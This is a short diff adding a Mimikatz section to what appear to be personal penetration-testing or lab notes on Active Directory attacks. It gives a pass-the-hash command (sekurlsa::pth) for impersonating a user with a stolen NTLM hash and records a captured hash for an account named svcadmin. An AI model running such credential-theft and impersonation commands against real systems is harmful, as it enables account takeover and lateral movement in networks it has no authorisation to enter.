@@ -45,3 +45,15 @@ If we have session objects for every session and we wanna execute commands on a 
 
 =======================================================================================
 
++++++++++++++++++++
+MIMIKATZ
++++++++++++++++++++
+
+To impersonate other user after finding the user's NTLM hash using "Invoke-Mimikatz -DumpCredentials"
+> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<ntlm_hash> /run:<executable_file>"'
+
+
+NTLM hash of svcadmin obtained from mgmt computer:
+b38ff50264b74508085d82c69794a4d8
+
+
